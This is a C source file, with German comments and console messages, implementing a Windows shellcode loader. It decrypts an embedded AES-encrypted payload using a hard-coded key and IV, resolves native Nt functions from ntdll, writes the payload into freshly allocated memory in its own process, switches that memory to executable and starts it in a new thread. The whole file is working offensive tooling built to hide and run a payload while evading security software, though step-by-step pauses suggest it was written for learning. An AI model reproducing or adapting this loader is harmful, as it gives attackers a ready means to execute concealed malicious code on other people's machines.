#define WIN32_NO_STATUS
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <bcrypt.h>

#define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)
#define KEYSIZE         32
#define IVSIZE          16

#pragma comment(lib, "Bcrypt.lib")

//Nt Prototypen Bauen

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
	HANDLE		ProcessHandle,
	PVOID*		BaseAddress,
	ULONG_PTR	ZeroBits,
	PSIZE_T		RegionSize,
	ULONG		AllocationType,
	ULONG		Protect
	);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
	HANDLE		ProcessHandle,
	PVOID*		BaseAddress,
	PSIZE_T		RegionSize,
	ULONG		NewProtect,
	PULONG		OldProtect
	);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
	HANDLE		ProcessHandle,
	PVOID		BaseAddress,
	PVOID		Buffer,
	ULONG		NumberOfBytesToWrite,
	PULONG		NumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)(
	HANDLE		ProcessHandle,
	PVOID*		BaseAddress,
	PSIZE_T		RegionSize,
	ULONG		FreeType
	);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE     ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID       ObjectAttributes,
    HANDLE      ProcessHandle,
    PVOID       StartRoutine,
    PVOID       Argument,
    ULONG       CreateFlags,
    SIZE_T      ZeroBits,
    SIZE_T      StackSize,
    SIZE_T      MaximumStackSize,
    PVOID       AttributeList
    );

//AES Struktur Bauen
typedef struct _AES {
    PBYTE   pPlainText;             
    DWORD   dwPlainSize;            

    PBYTE   pCipherText;            
    DWORD   dwCipherSize;           

    PBYTE   pKey;                   
    PBYTE   pIv;                    
}AES, * PAES;


BOOL InstallAesDecryption(PAES pAes) {

    BOOL                            bSTATE = TRUE;

    BCRYPT_ALG_HANDLE               hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE               hKeyHandle = NULL;

    ULONG                           cbResult = NULL;
    DWORD                           dwBlockSize = NULL;

    DWORD                           cbKeyObject = NULL;
    PBYTE                           pbKeyObject = NULL;

    PBYTE                           pbPlainText = NULL;
    DWORD                           cbPlainText = NULL;

    NTSTATUS                        STATUS = NULL;

   
    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Fehlgeschlagen mit Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Fehlgeschlagen mit Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Fehlgeschlagen mit Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // speicher allokieren für das key obj
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Fehlgeschlagen mit Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Fehlgeschlagen mit Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Fehlgeschlagen mit Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // allocating enough memory (of size cbPlainText)
    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Fehlgeschlagen mit Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
_EndOfFunc:
    if (hKeyHandle) {
        BCryptDestroyKey(hKeyHandle);
    }
    if (hAlgorithm) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    }
    if (pbKeyObject) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }
    if (pbPlainText != NULL && bSTATE) {
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    return bSTATE;
}

BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    AES Aes = {
            .pKey = pKey,
            .pIv = pIv,
            .pCipherText = pCipherTextData,
            .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) {
        return FALSE;
    }

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;

    return TRUE;
}

unsigned char AesCipherText[] = {
        0x9D, 0xF4, 0x71, 0x8F, 0xEC, 0xF3, 0xEC, 0x7D, 0x4F, 0x46, 0x95, 0x0A, 0xB6, 0xDC, 0x56, 0xB1,
        0xBE, 0xF7, 0xCA, 0x7E, 0xE9, 0x6D, 0x2E, 0x19, 0x7D, 0xC0, 0x72, 0x9A, 0xF3, 0xAB, 0x64, 0x03,
        0xA7, 0x3D, 0x11, 0xD7, 0x45, 0x79, 0x18, 0x23, 0x5F, 0x79, 0x3D, 0x8A, 0x77, 0xD3, 0x9A, 0xA2,
        0x12, 0xF6, 0x34, 0x03, 0x9D, 0x86, 0xD6, 0xE9, 0x5D, 0xB1, 0x2F, 0xD9, 0x8D, 0x94, 0x10, 0x41,
        0x48, 0x34, 0x7F, 0x5F, 0x4A, 0x00, 0xBD, 0x8B, 0x57, 0x4C, 0x58, 0x11, 0x97, 0x09, 0x81, 0xDA,
        0x9E, 0xB1, 0x53, 0x50, 0xE3, 0x2E, 0x39, 0xFD, 0xBC, 0x70, 0xED, 0xEE, 0x61, 0xCB, 0xD4, 0xB2,
        0x39, 0x81, 0xE2, 0xD6, 0x50, 0x2A, 0x7B, 0xC3, 0x5A, 0x8E, 0x1C, 0x02, 0xCF, 0x26, 0x96, 0xF5,
        0xA2, 0x4C, 0x22, 0x0F, 0x8E, 0x8D, 0x9E, 0x7B, 0x00, 0x8E, 0x35, 0xC6, 0x99, 0x9D, 0xF9, 0xFE,
        0x81, 0x3F, 0xA4, 0xFD, 0x65, 0xDA, 0x4F, 0x0C, 0xE5, 0x2E, 0x56, 0x9B, 0x4E, 0x2E, 0x3D, 0x0D,
        0xEA, 0xD0, 0xA9, 0x62, 0xA0, 0xC2, 0xC4, 0xF7, 0xF1, 0x86, 0x9A, 0x4A, 0xB1, 0x9F, 0x1E, 0x3E,
        0x64, 0x22, 0x38, 0x27, 0x2F, 0x6B, 0xD6, 0xE9, 0x5E, 0x83, 0xA5, 0x89, 0x32, 0x08, 0x9E, 0xCD,
        0x27, 0x98, 0xB3, 0x94, 0x2B, 0xEC, 0xAC, 0x96, 0x15, 0x5D, 0xE1, 0x3B, 0x3E, 0x72, 0x8C, 0x79,
        0xC5, 0x43, 0x11, 0x83, 0xE6, 0x86, 0xCD, 0x99, 0x3F, 0xC3, 0x6D, 0xD7, 0xB9, 0xD5, 0x66, 0x41,
        0x5F, 0xDE, 0xB3, 0x16, 0xD0, 0x9A, 0xDC, 0x7D, 0x28, 0xB4, 0x43, 0xD8, 0x19, 0x7F, 0x5A, 0xDA,
        0x0F, 0xE6, 0xA3, 0xF0, 0x53, 0x17, 0xE2, 0xF7, 0x5E, 0x08, 0x49, 0x47, 0x54, 0xC3, 0x3A, 0x14,
        0x6F, 0xA7, 0x7A, 0x00, 0xD5, 0xB6, 0x26, 0x36, 0xEC, 0x21, 0x04, 0xAB, 0x12, 0xE7, 0x2F, 0x50,
        0x8A, 0xAD, 0x77, 0xCC, 0xCB, 0x34, 0x63, 0xB3, 0x58, 0xC1, 0x2E, 0x34, 0xB1, 0x9E, 0xE2, 0x54,
        0x77, 0xFE, 0x85, 0x07, 0x44, 0x56, 0x88, 0x2B, 0x8D, 0x90, 0x79, 0x2A, 0x12, 0xFE, 0x6F, 0x74 };


unsigned char AesKey[] = {
        0x88, 0x04, 0xE8, 0x61, 0xF9, 0xDC, 0x21, 0xBB, 0x1E, 0x0C, 0xF0, 0x6E, 0xE4, 0x61, 0x41, 0xC9,
        0x2C, 0xC2, 0xB0, 0x05, 0x16, 0x63, 0xEF, 0x20, 0x7F, 0x3C, 0x68, 0xE9, 0xC8, 0xBA, 0x24, 0x57 };


unsigned char AesIv[] = {
        0xD0, 0x23, 0x21, 0x70, 0x18, 0x16, 0x2F, 0xDB, 0x64, 0xCF, 0x6A, 0x36, 0x65, 0xCF, 0x9F, 0x34 };

int main() {

    HANDLE hProc = GetCurrentProcess();
    PVOID base = NULL;
    SIZE_T PageSize = 0x2000;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("ntdll.dll konnte nicht geladen werden\n");
        return 1;
    }

    pNtAllocateVirtualMemory NtAllocateVirtualMem = (pNtAllocateVirtualMemory)
        GetProcAddress(ntdll, "NtAllocateVirtualMemory");

    pNtProtectVirtualMemory NtProtectVirtualMem = (pNtProtectVirtualMemory)
        GetProcAddress(ntdll, "NtProtectVirtualMemory");

    pNtWriteVirtualMemory NtWriteVirtualMem = (pNtWriteVirtualMemory)
        GetProcAddress(ntdll, "NtWriteVirtualMemory");

    pNtFreeVirtualMemory NtFreeVirtualMem = (pNtFreeVirtualMemory)
        GetProcAddress(ntdll, "NtFreeVirtualMemory");

    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)
        GetProcAddress(ntdll, "NtCreateThreadEx");

    if (!NtAllocateVirtualMem) {
        printf("[!] NtAllocateVirtualMemory nicht gefunden\n");
        return 1;
    }

    if (!NtProtectVirtualMem) {
        printf("[!] NtProtectVirtualMemory nicht gefunden\n");
        return 1;
    }

    if (!NtWriteVirtualMem) {
        printf("[!] NtWriteVirtualMemory nicht gefunden\n");
        return 1;
    }

    if (!NtFreeVirtualMem) {
        printf("[!] NtFreeVirtualMemory nicht gefunden\n");
        return 1;
    }

    PBYTE       pDeobfuscatedPayload = NULL;
    SIZE_T      sCipherSize = sizeof(AesCipherText);

    printf("[i] Injiziere Shellcode in die Lokale Adresse von PID: %d \n", GetCurrentProcessId());

    printf("[#] Drueke <Enter> um shellcode zu Entschlüsseln\n");
    getchar();

    printf("[!] Entschluesseln...\n");
    if (!SimpleDecryption(AesCipherText, sCipherSize, AesKey, AesIv, (PVOID*)&pDeobfuscatedPayload, (DWORD*)&sCipherSize)) {
        printf("[!] Enschlüsselung fehlgeschlagen\n");
    }
    printf("[#] Druecke <Enter> um Speicher zu allokieren\n");
    getchar();

    NTSTATUS status;

    status = NtAllocateVirtualMem(
        hProc,
        &base,
        0,
        &PageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtAllocateVirtaulMemory fehlgeschlagen mit Error : %d \n", GetLastError());
        return -1;
    }

    printf("[i] Shellcode sitzt an Adresse 0x%p\n", base);
    printf("[#] Druecke <Enter> um in den Speicher zu schreiben\n");
    getchar();

    status = NtWriteVirtualMem(
        hProc,
        base,
        pDeobfuscatedPayload,
        sCipherSize,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtWriteMemory fehlgeschlagen: 0x%08X\n", status);
        return -1;
    }

    printf("[+] Shellcode erfolgreich in den speicher geschrieben bei: ox%p\n", base);
    printf("[+] Berechtigungen des Speichers werden geändert.\n");

    ULONG dwOldProtection = 0;
    status = NtProtectVirtualMem(
        hProc,
        &base,
        &PageSize,
        PAGE_EXECUTE_READ,
        &dwOldProtection
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtProtectVirtualMemory fehlgeschlagen: 0x%08X\n", status);
        return -1;
    }
    printf("[+] Speicherrechte erfolgreich auf RX umgeschreiben\n");
    printf("[#] Druecke Enter um einen Thread zu erstellen\n");
    getchar();

    HANDLE hThread = NULL;

    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        base,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (!NT_SUCCESS(status)){
        printf("[!] NtCreateThread Fehlgeschlagen: 0x%08X\n", status);
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);

}
